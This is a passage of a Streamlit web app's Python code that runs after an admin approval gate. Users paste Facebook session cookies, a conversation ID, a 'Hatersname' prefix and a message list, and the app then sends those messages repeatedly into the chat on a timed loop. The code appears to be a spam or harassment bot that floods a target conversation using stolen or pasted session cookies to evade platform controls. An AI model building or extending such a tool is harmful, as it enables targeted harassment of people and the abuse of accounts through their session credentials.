        2. Send it to LORD DEVIL (or admin) via WhatsApp/Telegram/Facebook
        3. Ask admin to paste your key into Admin Panel (or add in GitHub approval.txt)
        4. Click 'Check Approval Status'
        """)
        st.markdown('</div>', unsafe_allow_html=True)
        st.stop()

    # Approved: show normal dashboard
    # Auto-start automation if configured
    if not st.session_state.auto_start_checked and st.session_state.user_id:
        st.session_state.auto_start_checked = True
        should_auto_start = db.get_automation_running(st.session_state.user_id)
        if should_auto_start and not st.session_state.automation_state.running:
            user_config = db.get_user_config(st.session_state.user_id)
            if user_config and user_config['chat_id']:
                start_automation(user_config, st.session_state.user_id)

    st.sidebar.markdown(f"### 👤 {st.session_state.username}")
    st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
    st.sidebar.markdown(f"**Status:** ✅ Approved")

    if st.sidebar.button("🚪 Logout", use_container_width=True):
        if st.session_state.automation_state.running:
            stop_automation(st.session_state.user_id)
        st.session_state.logged_in = False
        st.session_state.user_id = None
        st.session_state.username = None
        st.session_state.automation_running = False
        st.session_state.auto_start_checked = False
        st.session_state.approved = False
        st.session_state.approval_key = None
        st.session_state.approval_checked = False
        st.experimental_rerun()

    user_config = db.get_user_config(st.session_state.user_id)
    if user_config:
        tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
        with tab1:
            st.markdown("### Your Configuration")
            chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], placeholder="e.g., 1362400298935018", help="Facebook conversation ID from the URL")
            name_prefix = st.text_input("Hatersname", value=user_config['name_prefix'], placeholder="e.g., [END TO END]", help="Prefix to add before each message")
            delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, value=user_config['delay'], help="Wait time between messages")
            cookies = st.text_area("Facebook Cookies (optional - kept private)", value="", placeholder="Paste your Facebook cookies here (will be encrypted)", height=100, help="Your cookies are encrypted and never shown to anyone")
            messages = st.text_area("Messages (one per line)", value=user_config['messages'], placeholder="NP file copy paste karo", height=150, help="Enter each message on a new line")
            if st.button("💾 Save Configuration", use_container_width=True):
                final_cookies = cookies if cookies.strip() else user_config['cookies']
                db.update_user_config(st.session_state.user_id, chat_id, name_prefix, delay, final_cookies, messages)
                st.success("✅ Configuration saved successfully!")
                st.rerun()
        with tab2:
            st.markdown("### Automation Control")
            col1, col2, col3 = st.columns(3)
            with col1:
                st.metric("Messages Sent", st.session_state.automation_state.message_count)
            with col2:
                status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                st.metric("Status", status)
            with col3:
                st.metric("Total Logs", len(st.session_state.automation_state.logs))
            col1, col2 = st.columns(2)
            with col1:
                if st.button("▶️ Start E2ee", disabled=st.session_state.automation_state.running, use_container_width=True):
                    current_config = db.get_user_config(st.session_state.user_id)
                    if current_config and current_config['chat_id']:
                        start_automation(current_config, st.session_state.user_id)
                        st.rerun()
                    else:
                        st.error("❌ Please configure Chat ID first!")
            with col2:
                if st.button("⏹️ Stop E2ee", disabled=not st.session_state.automation_state.running, use_container_width=True):
                    stop_automation(st.session_state.user_id)
                    st.experimental_rerun()
            st.markdown('<div class="console-section"><h4 class="console-header"><i class="fas fa-terminal"></i> Live Console Monitor</h4></div>', unsafe_allow_html=True)
            if st.session_state.automation_state.logs:
                logs_html = '<div class="console-output">'
                for log in st.session_state.automation_state.logs[-50:]:
                    logs_html += f'<div class="console-line">{log}</div>'
                logs_html += '</div>'
                st.markdown(logs_html, unsafe_allow_html=True)
            else:
                st.markdown('<div class="console-output"><div class="console-line">🚀 Console ready... Start automation to see logs here.</div></div>', unsafe_allow_html=True)
            if st.session_state.automation_state.running:
                time.sleep(1)
                st.rerun()

# Footer
st.markdown('<div class="footer"> Tɦɘɣ Ƈɑɭɭ Ɦııɱ OƓ <br>All Rights Reserved</div>', unsafe_allow_html=True)
